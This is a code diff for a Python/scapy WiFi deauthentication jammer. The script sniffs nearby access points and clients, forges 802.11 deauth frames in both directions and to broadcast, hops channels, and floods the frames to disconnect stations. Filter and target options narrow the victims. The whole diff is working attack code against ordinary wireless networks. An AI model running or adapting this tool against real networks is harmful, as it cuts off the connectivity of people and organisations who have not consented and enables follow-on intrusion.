@@ -25,37 +25,54 @@ from scapy.layers.eap   import EAPOL
 class JAMMER:
 
 	__ACCESSPOINTS = []
-	__DECLIST      = []
+	__EXECUTED     = []
+	__DECPACKETS   = []
 
-	BROADCAST      = 'ff:ff:ff:ff:ff:ff'
-	EXCEPTION      = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:']
+	__BROADCAST    = "ff:ff:ff:ff:ff:ff"
 
 	def __init__(self, prs):
-		self.interface = prs.interface
-		self.sinterface = prs.sinterface
-		self.channel   = prs.channel
-		self.essids    = prs.essids
-		self.aps       = prs.aps
-		self.stations  = prs.stations
-		self.filters   = prs.filters
-		self.code      = prs.code
-		self.delay     = prs.delay
-		self.packets   = prs.packets
-		self.nobroadcast = prs.nobroadcast
-		self.verbose   = prs.verbose
+		self.verbose    = prs.verbose
+		self.exceptions = prs.exceptions
 
-	def extract_elt(self, layers, ident, ordone=False):
+		self.interface  = prs.interface
+
+		self.channel    = prs.channel
+		self.essids     = prs.essids
+		self.aps        = prs.aps
+		self.stations   = prs.stations
+		self.filters    = prs.filters
+
+		self.packets    = prs.packets
+		self.delay      = prs.delay
+		self.reset      = prs.reset
+		self.code       = prs.code
+
+	def extract_essid(self, layers):
 		retval = ''
 		counter = 0
 
 		try:
 			while True:
 				layer = layers[counter]
-				if hasattr(layer, "ID") and layer.ID == ident:
-					if ordone and layer.len == 1:
-						retval = ord(layer.info)
-					else:
-						retval = layer.info.decode('ascii')
+				if hasattr(layer, "ID") and layer.ID == 0:
+					retval = layer.info.decode('ascii')
+					break
+				else:
+					counter += 1
+		except IndexError:
+			pass
+
+		return retval
+		
+	def extract_channel(self, layers):
+		retval = ''
+		counter = 0
+
+		try:
+			while True:
+				layer = layers[counter]
+				if hasattr(layer, "ID") and layer.ID == 3 and layer.len == 1:
+					retval = ord(layer.info)
 					break
 				else:
 					counter += 1
@@ -64,137 +81,126 @@ class JAMMER:
 
 		return retval
 
-	def get_ess(self, sn, rc):
+	def get_ess(self, bss):
 		retval = ''
 
 		for ap in self.__ACCESSPOINTS:
-			if sn == ap.get('bssid') or rc == ap.get('bssid'):
-				retval = ap['essid']
+			if ap.get('bssid') == bss:
+				retval = ap.get('essid')
+				break
 
 		return retval
 
-	def get_ch(self, sn, rc):
-		retval = ''
+	def get_channel(self, bss):
+		retval = 0
 
 		for ap in self.__ACCESSPOINTS:
-			if sn == ap.get('bssid') or rc == ap.get('bssid'):
-				retval = ap['channel']
+			if ap.get('bssid') == bss:
+				retval = ap.get('channel')
 
 		return retval
 
-	def write(self, sender, receiver):
-		if self.verbose:
-			pull.print("*",
-				"Sent Deauths Count [{count}] Code [{code}] ({sdeveloper}) {sender} <--> ({rdeveloper}) {receiver} ({essid})".format(
-					count=pull.RED+str(self.packets)+pull.END,
-					code =pull.GREEN+str(self.code)+pull.END,
-					sender=pull.DARKCYAN+sender.upper().replace(":", "")+pull.END,
-					receiver=pull.DARKCYAN+receiver.upper().replace(":", "")+pull.END,
-					sdeveloper=pull.PURPLE+pull.get_mac(sender)+pull.END,
-					rdeveloper=pull.PURPLE+pull.get_mac(receiver)+pull.END,
-					essid=pull.YELLOW+self.get_ess(sender, receiver)+pull.END
-				),
-				pull.YELLOW
-			)
+	def filter_devices(self, sn, rc):
+		retval = {
+			'ap': '',
+			'sta': '',
+		}
+
+		for ap in self.__ACCESSPOINTS:
+			if ap.get('bssid') == sn:
+				retval['ap'] = sn
+				retval['sta'] = rc
+			elif ap.get('bssid') == rc:
+				retval['ap'] = rc
+				retval['sta'] = sn
+
+		return retval			
+
+	def clarify(self, toappend):
+		essid = toappend.get('essid')
+		bssid = toappend.get('bssid')
+
+		if self.essids:
+			if essid in self.essids:
+				if self.aps:
+					if bssid in self.aps:
+						self.__ACCESSPOINTS.append( toappend )
+				else:
+					self.__ACCESSPOINTS.append( toappend )
 		else:
-			pull.print("*",
-				"Sent Deauths Count [{count}] Code [{code}] {sender} <--> {receiver} ({essid})".format(
-					count=pull.RED+str(self.packets)+pull.END,
-					code =pull.GREEN+str(self.code)+pull.END,
-					sender=pull.DARKCYAN+sender.upper().replace(":", "")+pull.END,
-					receiver=pull.DARKCYAN+receiver.upper().replace(":", "")+pull.END,
-					essid=pull.YELLOW+self.get_ess(sender, receiver)+pull.END
-				),
-				pull.YELLOW
-			)
+			if self.aps:
+				if bssid in self.aps:
+					self.__ACCESSPOINTS.append( toappend )
+			else:
+				self.__ACCESSPOINTS.append( toappend )
 
-	def forge(self, sn, rc):
-		pkt = RadioTap() / Dot11(
-			type=0, 
-			subtype=12,
-			addr1=rc, 
-			addr2=sn, 
-			addr3=sn
-			) / Dot11Deauth(
-			reason=7
-			)
+	def invalid(self, sta):
+		for exception in self.exceptions:
+			if sta.startswith(exception):
+				return True
 
-		return pkt
+		return False
 
-	def jam(self, pkt):
-		sendp(
-			pkt,
-			iface=self.interface,
-			inter=self.delay,
-			count=self.packets,
-			verbose=False
-		)
-
-	def send(self, sender, receiver, oside=False):
-		pkta = self.forge(sender, receiver)
-		pktb = self.forge(receiver, sender)
-
-		toappend = (
-			sender,
-			receiver,
-			pkta,
-			pktb if not oside else False
-		)
-
-		self.__DECLIST.append(
-				toappend
-			)
-
-	def deauthenticate(self, sender, receiver):
-		if self.aps and self.stations and self.filters:
-			if not sender in self.filters and not receiver in self.filters:
-				if sender in self.aps or receiver in self.aps or sender in self.stations or receiver in self.stations:
-					self.send(
-						sender,
-						receiver
-					)
-		elif self.aps and self.stations and not self.filters:
-			if sender in self.aps or receiver in self.aps or sender in self.stations or receiver in self.stations:
-				self.send(
-					sender,
-					receiver
-				)
-		elif self.aps and not self.stations and self.filters:
-			if not sender in self.filters and not receiver in self.filters:
-				if sender in self.aps or receiver in self.aps:
-					self.send(
-						sender,
-						receiver
-					)
-		elif not self.aps and self.stations and self.filters:
-			if not sender in self.filters and not receiver in self.filters:
-				if sender in self.stations or receiver in self.stations:
-					self.send(
-						sender,
-						receiver
-					)
-		elif self.aps and not self.stations and not self.filters:
-			if sender in self.aps or receiver in self.aps:
-				self.send(
-					sender,
-					receiver
-				)
-		elif not self.aps and not self.stations and self.filters:
-			if not sender in self.filters and not receiver in self.filters:
-				self.send(
-					sender,
-					receiver
-				)
-		elif not self.aps and self.stations and not self.filters:
-			if sender in self.stations or receiver in self.stations:
-				self.send(
-					sender,
-					receiver
-				)
+	def is_valid_sta(self, sta):
+		if self.stations:
+			if sta in self.stations:
+				return True
+			else:
+				return False
 		else:
-			self.send(
-				sender, receiver
-			)
+			return True
+
+	def get_crate(self, ch):
+		retval = []
+
+		for connection in self.__DECPACKETS:
+			channel = connection.get('channel')
+
+			if channel == ch:
+				retval.append(connection)
+
+		return retval
+
+	def forge(self, ap, sta):
+		def fpkt(sn, rc):
+			pkt = RadioTap() / Dot11(
+				type=0, 
+				subtype=12,
+				addr1=rc, 
+				addr2=sn, 
+				addr3=sn
+				) / Dot11Deauth(
+				reason=self.code
+				)
+			return pkt
+
+		retval = []
+
+		if sta != self.__BROADCAST:
+			retval.append(fpkt(ap, sta))
+			retval.append(fpkt(sta, ap))
+		else:
+			retval.append(fpkt(ap, sta))
+
+		return retval
+
+	def filtertify(self, ap, sta):
+		if self.invalid(sta):
+			return
+		else:
+			if ap not in self.filters and sta not in self.filters:
+				if self.is_valid_sta(sta):
+					onrun_form = (ap, sta)
+					if onrun_form not in self.__EXECUTED:
+
+						self.__EXECUTED.append(onrun_form)
+						pkt_form = {
+							'ap': ap,
+							'sta': sta,
+							'channel': self.get_channel(ap),
+						}
+
+						self.__DECPACKETS.append(pkt_form)
 
 	def injector(self, pkt):
 		if pkt.haslayer(Dot11Beacon):
@@ -203,211 +209,158 @@ class JAMMER:
 			except:
 				bssid = pkt.getlayer(Dot11).addr2
 
-			essid = self.extract_elt(pkt.getlayer(Dot11Elt), 0)
-			channel = self.extract_elt(pkt.getlayer(Dot11Elt), 3, ordone=True)
-			if channel:
-				toappend = {
-					'essid': essid,
-					'bssid': bssid,
-					'channel': channel
-				}
-				if toappend not in self.__ACCESSPOINTS:
-					self.__ACCESSPOINTS.append(
-						toappend
-					)
-					
-				if (not self.nobroadcast) and (not self.aps) and (not self.stations) and (not self.essids) and (not self.filters):
-					self.send(
-						bssid, self.BROADCAST, oside=True
-					)
+			essid = self.extract_essid(pkt.getlayer(Dot11Elt))
+			channel = self.extract_channel(pkt.getlayer(Dot11Elt))
 
-		elif pkt.haslayer(Dot11FCS) and pkt.getlayer(Dot11FCS).type == 2 and not pkt.haslayer(EAPOL):
-			sender   = pkt.getlayer(Dot11FCS).addr2
-			receiver = pkt.getlayer(Dot11FCS).addr1
+			toappend = {
+				'essid': essid,
+				'bssid': bssid,
+				'channel': channel
+			}
 
-			if (self.nobroadcast) or (self.aps) or (self.stations) or (self.essids) or (self.filters):
-				for bssid in self.EXCEPTION:
-					if sender.startswith( bssid ) or receiver.startswith( bssid ):
-						return
+			if toappend not in self.__ACCESSPOINTS:
+				self.clarify(
+					toappend
+				)
 
-				essid   = self.get_ess(sender, receiver)
-				channel = self.get_ch(sender, receiver)
-				if channel:
-					if self.essids and essid in self.essids:
-						self.deauthenticate(sender, receiver)
-					else:
-						self.deauthenticate(sender, receiver)
-
-		elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2 and not pkt.haslayer(EAPOL):
-			sender   = pkt.getlayer(Dot11).addr2
-			receiver = pkt.getlayer(Dot11).addr1
-
-			if (self.nobroadcast) or (self.aps) or (self.stations) or (self.essids) or (self.filters):
-				for bssid in self.EXCEPTION:
-					if sender.startswith( bssid ) or receiver.startswith( bssid ):
-						return
-
-				essid   = self.get_ess(sender, receiver)
-				channel = self.get_ch(sender, receiver)
-				if channel:
-					if self.essids and essid in self.essids:
-						self.deauthenticate(sender, receiver)
-					else:
-						self.deauthenticate(sender, receiver)
-
-	def runner(self):
-		while True:
-			if self.__DECLIST:
-				tocut = self.__DECLIST[0]
-				del self.__DECLIST[0]
-
-				sn = tocut[0]
-				rc = tocut[1]
-
-				channel = self.get_ch(sn, rc)
-				self.hopper(channel)
-				for pkt in (tocut[2], tocut[3]):
-					if pkt:
-						self.jam(
-							pkt
-						)
-
-				self.write(sn, rc)
-
-	def hopper(self, chs):
-		if type(chs) == tuple:
-			ch = random.choice(chs)
-			while True:
-				subprocess.call(['iwconfig', self.sinterface, 'channel', str(ch)])
-				time.sleep(1)
-
-				lc = ch
-				ch = random.choice(chs)
-				while ch == lc:
-					ch = random.choice(chs)
 		else:
-			subprocess.call(['iwconfig', self.interface, 'channel', str(chs)])
+			sender = receiver = ""
+			if pkt.haslayer(Dot11FCS) and pkt.getlayer(Dot11FCS).type == 2 and not pkt.haslayer(EAPOL):
+				sender   = pkt.getlayer(Dot11FCS).addr2
+				receiver = pkt.getlayer(Dot11FCS).addr1
+
+			elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 2 and not pkt.haslayer(EAPOL):
+				sender   = pkt.getlayer(Dot11).addr2
+				receiver = pkt.getlayer(Dot11).addr1
+
+			if sender and receiver:
+				result  = self.filter_devices(sender, receiver)
+
+				if result.get('ap') and result.get('sta'):
+					self.filtertify(result.get('ap'), result.get('sta'))
+
+	def write(self, ap, sta):
+		if self.verbose:
+			pull.print("*",
+				"Sent Deauths Count [{count}] Code [{code}] ({sdeveloper}) {sender} <--> ({rdeveloper}) {receiver} ({essid}) [{channel}]".format(
+					count=pull.RED+str(self.packets)+pull.END,
+					code =pull.GREEN+str(self.code)+pull.END,
+					sender=pull.DARKCYAN+ap.upper()+pull.END,
+					receiver=pull.DARKCYAN+sta.upper()+pull.END,
+					sdeveloper=pull.PURPLE+pull.get_mac(ap)+pull.END,
+					rdeveloper=pull.PURPLE+pull.get_mac(sta)+pull.END,
+					essid=pull.YELLOW+self.get_ess(ap)+pull.END,
+					channel=pull.RED+str(self.get_channel(ap))+pull.END
+				),
+				pull.YELLOW
+			)
+		else:
+			pull.print("*",
+				"Sent Deauths Count [{count}] Code [{code}] {sender} <--> {receiver} ({essid}) [{channel}]".format(
+					count=pull.RED+str(self.packets)+pull.END,
+					code =pull.GREEN+str(self.code)+pull.END,
+					sender=pull.DARKCYAN+ap.upper()+pull.END,
+					receiver=pull.DARKCYAN+sta.upper()+pull.END,
+					essid=pull.YELLOW+self.get_ess(ap)+pull.END,
+					channel=pull.RED+str(self.get_channel(ap))+pull.END
+				),
+				pull.YELLOW
+			)
+
+	def jammer(self):
+		while True:
+			ch = random.choice(self.channel)
+			subprocess.call(['iwconfig', self.interface, 'channel', str(ch)])
+			time.sleep(0.5)
+
+			crate = self.get_crate(ch)
+
+			for connection in crate:
+				ap = connection.get( 'ap' )
+				sta = connection.get( 'sta' )
+				channel = connection.get( 'channel' )
+
+				pkts = self.forge(ap, sta)
+				for pkt in pkts:
+					sendp(pkt, iface=self.interface, count=self.packets, inter=self.delay, verbose=False)
+
+				self.write(ap, sta)
+
+			self.resetter()
+
+			time.sleep(0.5)
+
+	def resetter(self):
+		if self.reset:
+			if len(self.__EXECUTED) >= self.reset:
+				self.__EXECUTED = []
+				self.__DECPACKETS = []
 
 	def engage(self):
-		t = threading.Thread(target=self.hopper, args=(self.channel,))
+		t = threading.Thread(target=self.jammer)
 		t.daemon = True
 		t.start()
 
-		t = threading.Thread(target=self.runner)
-		t.daemon = True
-		t.start()
-
-		interface = (self.sinterface if self.sinterface else self.interface)
-		sniff(
-			iface=interface, 
-			prn=self.injector
-		)
+		sniff(iface=self.interface, prn=self.injector)
 
 class PARSER:
 
 	def __init__(self, opts):
-		self.help = self.help(opts.help)
-		self.interface = self.iface(opts.interface, True)
-		self.sinterface = self.iface(opts.sinterface)
-		self.channel   = self.channel(opts.channel)
-		self.essids    = self.essids(opts.essids)
-		self.aps       = self.aps(opts.aps)
-		self.stations  = self.stations(opts.stations)
-		self.filters   = self.filters(opts.filters)
-		self.valid     = self.validate()
-		self.code      = opts.code if (opts.code >= 1 and opts.code <= 66) else pull.halt("Invalid Reason Code", True, pull.RED)
-		self.delay     = opts.delay if opts.delay >= 0 else pull.halt("Invalid Delay Between Requests", True, pull.RED)
-		self.packets   = opts.packets if opts.packets > 0 else pull.halt("Packets Must Be greater than 0", True, pull.RED)
-		self.verbose   = opts.verbose
-		self.nobroadcast = opts.nobroadcast
-		self.signal    = signal.signal(signal.SIGINT, self.handler)
+		self.world       = opts.world
+		self.exceptions  = self.exceptions(opts.nbroadcast)
+		self.verbose     = opts.verbose
+		self.interface   = self.interface(opts.interface)
 
-	def validate(self):
-		if self.sinterface:
-			return True
+		self.channel     = self.channel(opts.channel)
+		self.essids      = self.form_essids(opts.aps)
+		self.aps         = self.form_macs(opts.aps)
+		self.stations    = self.form_macs(opts.stations)
+		self.filters     = self.form_macs(opts.filters)
+
+		self.packets     = opts.packets if opts.packets > 0 else pull.halt("Number of packets Must Be >= 1", True, pull.RED)
+		self.delay       = opts.delay   if opts.delay   >= 0 else pull.halt("Delay Interval Must be >= 0", True, pull.RED)
+		self.reset       = opts.reset   if ((opts.reset == 0) or (opts.reset >= 5)) else pull.halt("Reset Must Be >= 5. ")
+		self.code        = opts.code    if ((opts.code >= 1) and (opts.code <= 66)) else pull.halt("Code Must Be Greater Greater >= 1 and <= 66")
+
+	def exceptions(self, nbroadcast):
+		retval = []
+		if not nbroadcast:
+			retval = ['00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:']
 		else:
-			if type(self.channel) != tuple:
-				return True
-			else:
-				pull.halt("A specific Channel Must Be given, if only primary interface is provided. ", True, pull.RED)
+			retval = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:']
+		return retval
 
-	def handler(self, sig, fr):
-		pull.halt(
-				"CTRL+C Received. Exiting", 
-				True,
-				"\r",
-				pull.RED
-			)
-
-	def help(self, hl):
-		if hl:
-			pull.help()
-
-	def channel(self, ch):
-		chs = tuple(range(1,15))
-		if ch:
-			if ch in chs:
-				return ch
-			else:
-				pull.halt("Not a Valid Channel. Choose in between 1-14.", True, pull.RED)
-		else:
-			return chs
-
-	def essids(self, essids):
+	def form_essids(self, essids):
 		retval = []
 		if essids:
-			essids = essids.split(",")
-			for essid in essids:
-				retval.append(essid)
-		else:
-			return []
-
-	def aps(self, aps):
-		retval = []
-		if aps:
-			aps = aps.split(",")
-			for ap in aps:
-				ap = ap.lower()
-				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", ap):
-					retval.append(ap)
-				else:
-					pull.halt("Not a Valid BSSID [%s]" % ap, True, pull.RED)
-		else:
-			return retval
+			toloop = essids.split(",")
+			for essid in toloop:
+				if not re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", essid):
+					retval.append(essid)
 
 		return retval
 
-	def stations(self, sts):
+	def form_macs(self, bssids):
 		retval = []
-		if sts:
-			sts = sts.split(",")
-			for st in sts:
-				st = st.lower()
-				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", st):
-					retval.append(st)
-				else:
-					pull.halt("Not a Valid MAC Address [%s]" % st, True, pull.RED)
-		else:
-			return retval
+		if bssids:
+			toloop = bssids.split(",")
+			for bssid in toloop:
+				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", bssid):
+					retval.append(bssid.lower())
 
 		return retval
 
-	def filters(self, fts):
-		retval = []
-		if fts:
-			fts = fts.split(",")
-			for ft in fts:
-				ft = ft.lower()
-				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", ft):
-					retval.append(ft)
-				else:
-					pull.halt("Not a Valid MAC Address [%s]" % ft, True, pull.RED)
+	def channel(self, ch):
+		retval = list(range(1,15)) if self.world else list(range(1,12))
+		if ch:
+			if ch in retval:
+				return [ch]
+			else:
+				pull.halt("Invalid Channel Given.", True, pull.RED)
 		else:
 			return retval
 
-		return retval
-
-	def iface(self, iface, req=False):
+	def interface(self, iface):
 		def getNICnames():
 			ifaces = []
 			dev = open('/proc/net/dev', 'r')
@@ -425,69 +378,77 @@ class PARSER:
 			else:
 				return False
 
-		if req:
-			if not iface:
-				pull.halt("Interface Not Provided. You need to provide atleast primary interface!", True, pull.RED)
-
-		ifaces = getNICnames()
-		if iface in ifaces:
-			if confirmMon(iface):
-				return iface
+		if iface:
+			ifaces = getNICnames()
+			if iface in ifaces:
+				if confirmMon(iface):
+					return iface
+				else:
+					pull.halt("Interface Not In Monitor Mode [%s]" % (pull.RED + iface + pull.END), True, pull.RED)
 			else:
-				pull.halt("Interface Not in Monitor Mode [%s]" % iface, True, pull.RED) 
+				pull.halt("Interface Not Found. [%s]" % (pull.RED + iface + pull.END), True, pull.RED)
 		else:
-			if iface:
-				pull.halt("No Such Interface [%s]" % iface, True, pull.RED)
-
+			pull.halt("Interface Not Provided. Specify an Interface!", True, pull.RED)
 
 def main():
-	parser = argparse.ArgumentParser( add_help=False )
+	parser = argparse.ArgumentParser(add_help=True)
 
-	parser.add_argument('-h', '--help', dest="help", default=False, action="store_true")
-	parser.add_argument('-i', '--interface', dest="interface", default="", type=str)
-	parser.add_argument('-z', '--scan-interface', dest="sinterface", default="", type=str)
-	parser.add_argument('-c', '--channel'  , dest="channel"  , default=0 , type=int)
-	parser.add_argument('-e', '--essids'    , dest="essids"   , default="", type=str)
-	parser.add_argument('-a', '--access-points', dest="aps"  , default="", type=str)
-	parser.add_argument('-s', '--stations' , dest="stations" , default="", type=str)
-	parser.add_argument('-f', '--filters'  , dest="filters"  , default="", type=str)
-	parser.add_argument('--code'           , dest="code"     , default=7 , type=int)
-	parser.add_argument('--delay'          , dest="delay"    , default=0.1 , type=int)
-	parser.add_argument('--packets'        , dest="packets"  , default=1, type=int)
-	parser.add_argument('--no-broadcast'   , dest="nobroadcast", default=False, action="store_true")
-	parser.add_argument('--verbose'        , dest="verbose"  , default=False, action="store_true")
+	parser.add_argument('-i', '--interface'   , dest="interface", default="", type=str)
+
+	parser.add_argument('-c', '--channel'     , dest="channel"  , default=0 , type=int)
+	parser.add_argument('-a', '--accesspoints', dest="aps"   , default="", type=str)
+	parser.add_argument('-s', '--stations'    , dest="stations", default="", type=str)
+	parser.add_argument('-f', '--filters'     , dest="filters" , default="", type=str)
+
+	parser.add_argument('-p', '--packets'     , dest="packets" , default=20 , type=int)
+	parser.add_argument('-d', '--delay'       , dest="delay"   , default=0.1, type=int)
+	parser.add_argument('-r', '--reset'       , dest="reset"   , default=0  , type=int)
+	parser.add_argument('--code'              , dest="code"    , default=7  , type=int)
+
+	parser.add_argument('--world'             , dest="world"     , default=False, action="store_true")
+	parser.add_argument('--no-broadcast'      , dest="nbroadcast", default=False, action="store_true")
+	parser.add_argument('--verbose'           , dest="verbose"   , default=False, action="store_true")
 
 	options = parser.parse_args()
-	parser  = PARSER(options)
+	parser = PARSER(options)
 
 	pull.print(
 		"*",
-		"IFACE [{iface}] CH [{channel}]".format(
-			iface=parser.interface,
-			channel=("Hop" if type(parser.channel) == tuple else parser.channel)
+		"IFACE [{interface}] CHANNEL [{channel}] VERBOSE [{verbose}]".format(
+			interface=pull.DARKCYAN+parser.interface+pull.END,
+			channel=pull.DARKCYAN+str(("HOP" if len(parser.channel) > 1 else parser.channel[0]))+pull.END,
+			verbose=pull.DARKCYAN+("True" if parser.verbose else "False")+pull.END
 		),
-		pull.YELLOW
+		pull.DARKCYAN,
 	)
+
 	pull.print(
 		"*",
-		"APS [{bssids}] STS [{sts}] CODE [{code}]".format(
-			bssids=len(parser.aps),
-			sts   =len(parser.stations),
-			code  =parser.code,
+		"APS [{aps}] STATIONS [{stations}] FILTERS [{filters}]".format(
+			aps=pull.DARKCYAN+str(len(parser.aps))+pull.END,
+			stations=pull.DARKCYAN+str(len(parser.stations))+pull.END,
+			filters=pull.DARKCYAN+str(len(parser.filters))+pull.END
 		),
-		pull.RED
+		pull.DARKCYAN
 	)
+
 	pull.print(
 		"*",
-		"FILTERS [{filters}] STS [{delay}] PKTS [{packets}]".format(
-			filters=len(parser.filters),
-			delay  =parser.delay,
-			packets=parser.packets,
+		"PACKETS [{packets}] DELAY [{delay}] RST [{reset}] CD [{code}]".format(
+			packets=pull.DARKCYAN+str(parser.packets)+pull.END,
+			delay=pull.DARKCYAN+str(parser.delay)+pull.END,
+			reset=pull.DARKCYAN+str(parser.reset)+pull.END,
+			code=pull.DARKCYAN+str(parser.code)+pull.END
 		),
+		pull.DARKCYAN
+	)
+
+	pull.print(
+		"^",
+		"Engaing With Jammer Now",
 		pull.GREEN
 	)
 
-	pull.print("^", "Engaging Now. Starting Jammer. ", pull.DARKCYAN)
 	jammer = JAMMER(parser)
 	jammer.engage()
 
